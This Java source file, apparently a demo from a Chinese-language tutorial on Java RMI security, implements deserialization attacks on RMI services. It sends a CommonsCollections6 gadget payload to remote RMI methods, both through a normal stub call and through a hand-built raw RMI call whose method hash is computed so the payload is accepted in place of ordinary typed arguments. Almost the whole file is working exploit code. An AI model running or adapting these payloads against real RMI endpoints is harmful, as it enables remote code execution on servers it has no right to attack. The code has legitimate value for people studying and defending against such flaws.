package com.dem0.rmi;
import com.dem0.internal.ReflectUtils;
import com.dem0.vuln.CC6;
import de.qtc.rmg.internal.MethodCandidate;
import de.qtc.rmg.networking.RMIRegistryEndpoint;
import de.qtc.rmg.plugin.PluginSystem;
import de.qtc.rmg.utils.RemoteObjectWrapper;
import sun.rmi.server.MarshalOutputStream;
import sun.rmi.transport.TransportConstants;

import javax.net.SocketFactory;
import java.io.*;
import java.net.Socket;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.security.DigestOutputStream;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

public class Main {
    /**
     * 参数列表为对象类型
     */
    public  static  void genpayload1(){
        try {
//            new sun.rmi.UnicastServerRef();
            Registry registry = LocateRegistry.getRegistry("192.168.59.1", 1099);
            registry.list();
            ICalc calc = (ICalc) registry.lookup("calc");
            List<Integer> li = new ArrayList<Integer>();
            li.add(1);
            li.add(2);
            System.out.println(calc.equ(new CC6().getPayload(),1));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 参数类型为非对象类型
     */
    public static void sendRawCall(String host, int port, ObjID objid, int opNum, Long hash, Object ...objects) throws Exception {
        Socket socket = SocketFactory.getDefault().createSocket(host, port);
        socket.setKeepAlive(true);
        socket.setTcpNoDelay(true);
        DataOutputStream dos = null;
        try {
            OutputStream os = socket.getOutputStream();
            dos = new DataOutputStream(os);

            dos.writeInt(TransportConstants.Magic);
            dos.writeShort(TransportConstants.Version);
            dos.writeByte(TransportConstants.SingleOpProtocol);
            dos.write(TransportConstants.Call);

            final ObjectOutputStream objOut = new MarshalOutputStream(dos);

            objid.write(objOut); //Objid
            objOut.writeInt(opNum); // opnum
            objOut.writeLong(hash); // hash
            for (Object object:
                    objects) {
                objOut.writeObject(object);
            }

            os.flush();
        } finally {
            if (dos != null) {
                dos.close();
            }
            if (socket != null) {
                socket.close();
            }
        }
    }
    private static long computeMethodHash(String methodSignature) {
        long hash = 0;
        ByteArrayOutputStream sink = new ByteArrayOutputStream(127);
        try {
            MessageDigest md = MessageDigest.getInstance("SHA");
            DataOutputStream out = new DataOutputStream(new DigestOutputStream(sink, md));

            out.writeUTF(methodSignature);

            // use only the first 64 bits of the digest for the hash
            out.flush();
            byte hasharray[] = md.digest();
            for (int i = 0; i < Math.min(8, hasharray.length); i++) {
                hash += ((long) (hasharray[i] & 0xFF)) << (i * 8);
            }
        } catch (IOException ignore) {
            /* can't happen, but be deterministic anyway. */
            hash = -1;
        } catch (NoSuchAlgorithmException complain) {
            throw new SecurityException(complain.getMessage());
        }
        return hash;
    }
    public static void genpayload2(){
        try {
            ReflectUtils.enableCustomRMIClassLoader();
            PluginSystem.init(null);
            RMIRegistryEndpoint rmiRegistry = new RMIRegistryEndpoint("127.0.0.1",1099);
            //还记得遍历攻击里我们实现的无依赖获取远程对象存根吗，这里直接套用了。
            RemoteObjectWrapper remoteObj = new RemoteObjectWrapper(rmiRegistry.lookup("r"),"math");
            Object payloadObj = new CC6().getPayload();
            //methodSignature 可以通过javap -s 类名计算
            final String methodSignature = "add(Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;";
            //这里直接扒了rmi对应的源码
            Long methodHash = computeMethodHash(methodSignature);
            sendRawCall(remoteObj.getHost(),remoteObj.getPort(),remoteObj.objID,-1,methodHash,payloadObj);
        }catch (Throwable t){
            t.printStackTrace();
        }
    }
    /**
     * 最基本的参数
     * @param args
     */
    public static void main(String[] args) throws NotBoundException, RemoteException {
        Registry registry = LocateRegistry.getRegistry("192.168.59.1", 2499);
        ICalc calc = (ICalc) registry.lookup("calc");
        List<Integer> li = new ArrayList<Integer>();
        li.add(1);
        li.add(2);
        System.out.println(calc.sum(li));
    }
}
